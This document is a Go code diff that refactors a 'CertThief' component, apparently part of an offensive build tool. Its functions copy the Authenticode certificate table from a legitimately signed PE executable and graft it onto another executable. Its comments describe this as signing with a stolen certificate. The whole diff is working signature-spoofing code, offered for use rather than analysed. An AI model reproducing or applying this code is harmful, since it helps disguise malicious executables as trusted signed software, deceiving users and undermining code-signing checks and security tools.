@@ -1,7 +1,6 @@
 package build
 
 import (
-	"bytes"
 	"fmt"
 	"os"
 	"path/filepath"
@@ -19,35 +18,35 @@ type CertThief struct {
 	CertFile string // 证书文件
 }
 
-// readCertTable 从PE文件中读取证书表
-func (ct *CertThief) readCertTable(filePath string) ([]byte, error) {
-	fileBytes, err := os.ReadFile(filePath)
+// ReadCertTable 从PE文件中读取证书表
+func (ct *CertThief) ReadCertTable(filePath string) ([]byte, error) {
+	f, err := os.Open(filePath) // 修改为流式读取
 	if err != nil {
-		return nil, fmt.Errorf("failed to read file: %v", err)
+		return nil, fmt.Errorf("file open failed: %w", err)
 	}
+	defer f.Close()
 
-	fileReader := bytes.NewReader(fileBytes)
-	peFile, err := pe.NewFile(fileReader)
+	peFile, err := pe.NewFile(f)
 	if err != nil {
-		return nil, fmt.Errorf("failed to parse PE file: %v", err)
+		return nil, fmt.Errorf("PE parse failed: %w", err)
 	}
-
 	return peFile.CertificateTable, nil
 }
 
-// saveSignedPE 保存带有证书表的PE文件
-func (ct *CertThief) saveSignedPE(certTable []byte, outputFileName string) error {
-	peFile, err := pe.Open(filepath.Join(ct.SignDir, ct.SrcFile))
-	if err != nil {
-		return fmt.Errorf("failed to open PE file: %v", err)
+// SaveSignedPE 保存带有证书表的PE文件
+func (ct *CertThief) SaveSignedPE(certTable []byte, outputFileName string) error {
+	p := filepath.Join(ct.SignDir, ct.SrcFile)
+	peFile, errOpen := pe.Open(p)
+	if errOpen != nil {
+		return fmt.Errorf("failed to open PE file: %v", errOpen)
 	}
 	defer peFile.Close()
 
 	peFile.CertificateTable = certTable
 
 	outputFilePath := filepath.Join(ct.SignDir, outputFileName)
-	if err := peFile.WriteFile(outputFilePath); err != nil {
-		return fmt.Errorf("failed to write PE file: %v", err)
+	if errWrite := peFile.WriteFile(outputFilePath); errWrite != nil {
+		return fmt.Errorf("failed to write PE file: %v", errWrite)
 	}
 
 	log.Infof("Signed file saved to: %s", outputFilePath)
@@ -56,14 +55,15 @@ func (ct *CertThief) saveSignedPE(certTable []byte, outputFileName string) error
 
 // SaveCertificate 将证书表保存到指定文件
 func (ct *CertThief) SaveCertificate() error {
-	certTable, err := ct.readCertTable(filepath.Join(ct.SignDir, ct.DstFile))
+	p := filepath.Join(ct.SignDir, ct.DstFile)
+	certTable, err := ct.ReadCertTable(p)
 	if err != nil {
 		return err
 	}
 
 	certFilePath := filepath.Join(ct.SignDir, ct.CertFile)
-	if err := os.WriteFile(certFilePath, certTable, os.ModePerm); err != nil {
-		return fmt.Errorf("failed to save certificate: %v", err)
+	if errWrite := os.WriteFile(certFilePath, certTable, os.ModePerm); errWrite != nil {
+		return fmt.Errorf("failed to save certificate: %v", errWrite)
 	}
 
 	log.Infof("Certificate saved to %s", certFilePath)
@@ -72,20 +72,21 @@ func (ct *CertThief) SaveCertificate() error {
 
 // SignWithStolenCert 使用窃取的证书对源文件进行签名
 func (ct *CertThief) SignWithStolenCert() error {
-	certBytes, err := os.ReadFile(filepath.Join(ct.SignDir, ct.CertFile))
+	pCert := filepath.Join(ct.SignDir, ct.CertFile) // 证书路径
+	bCert, err := os.ReadFile(pCert)
 	if err != nil {
-		return fmt.Errorf("failed to read certificate file: %v", err)
+		return fmt.Errorf("sign failed: %w (cert: %s)", err, pCert)
 	}
 
-	return ct.saveSignedPE(certBytes, ct.SignedPE)
+	return ct.SaveSignedPE(bCert, ct.SignedPE)
 }
 
 // SignExecutable 使用目标文件的证书对源文件进行签名
 func (ct *CertThief) SignExecutable() error {
-	certTable, err := ct.readCertTable(filepath.Join(ct.SignDir, ct.DstFile))
+	pFile := filepath.Join(ct.SignDir, ct.DstFile) // 待签名文件路径
+	certTable, err := ct.ReadCertTable(pFile)
 	if err != nil {
 		return err
 	}
-
-	return ct.saveSignedPE(certTable, ct.SignedPE)
+	return ct.SaveSignedPE(certTable, ct.SignedPE)
 }
